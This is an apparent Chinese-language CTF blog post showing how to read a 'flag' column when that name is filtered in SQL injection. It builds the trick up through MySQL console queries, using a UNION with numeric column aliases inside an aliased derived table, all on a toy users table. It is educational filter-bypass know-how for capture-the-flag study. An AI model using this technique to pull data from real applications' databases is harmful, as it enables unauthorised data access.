---
title: CTF中SQL注入字段名被过滤小技巧
tags:
  - CTF
  - 注入
  - web
category: [渗透测试,Web安全,SQL注入]
abbrlink: a62e54a0
date: 2018-03-12 11:04:07
---
# 0x00 前言 
CTF中SQL注入字段名被过滤小技巧，后续有学习到啥好方法再加进来
# 0x01 问题引入
```mysql
mysql> select * from users;
+--------+-----------+
| points | flag      |
+--------+-----------+
| 31     | daiker666 |
+--------+-----------+
1 row in set (0.00 sec)
```
然后我们已经知道表名users，要查询flag的值，但是flag被过滤了。
<!--more-->
# 0x02 问题思考
常规的查询是`select flag from users`,如果我要在们的查询语句中不见到`flag`，就得把`flag`这个列设置别名，mysql设置列别名有两种方法。
```mysql
mysql> select flag as haha from users;
+-----------+
| haha      |
+-----------+
| daiker666 |
+-----------+
1 row in set (0.00 sec)

mysql> select (flag)haha from users;
+-----------+
| haha      |
+-----------+
| daiker666 |
+-----------+
1 row in set (0.00 sec)
```
但是这样我们还会出现flag这个字段。这时候想到这个
```mysql
mysql> select 1;
+---+
| 1 |
+---+
| 1 |
+---+
1 row in set (0.00 sec)

mysql> select 1,2;
+---+---+
| 1 | 2 |
+---+---+
| 1 | 2 |
+---+---+
1 row in set (0.00 sec)
```
这样列名不久变成我们想要的结果，然而我们想要的结果是users表的内容，我们可以使用联合查询
```mysql
mysql> select 1,2 union select * from users;
+------+-----------+
| 1    | 2         |
+------+-----------+
| 1    | 2         |
| 31   | daiker666 |
+------+-----------+
2 rows in set (0.01 sec)
```
这样我们想要的值就在表里面，，下面思考下怎么提取出来，查询的结果是一张虚表，我们可以用设置别名的方法给这张表命名
```mysql
mysql> select * from (select 1,2 union select * from users)c;
+------+-----------+
| 1    | 2         |
+------+-----------+
| 1    | 2         |
| 31   | daiker666 |
+------+-----------+
2 rows in set (0.02 sec)
```
然后提取flag
```mysql
mysql> select c.2 from (select 1,2 union select * from users)c limit 1,2;
+-----------+
| 2         |
+-----------+
| daiker666 |
+-----------+
1 row in set (0.02 sec)
```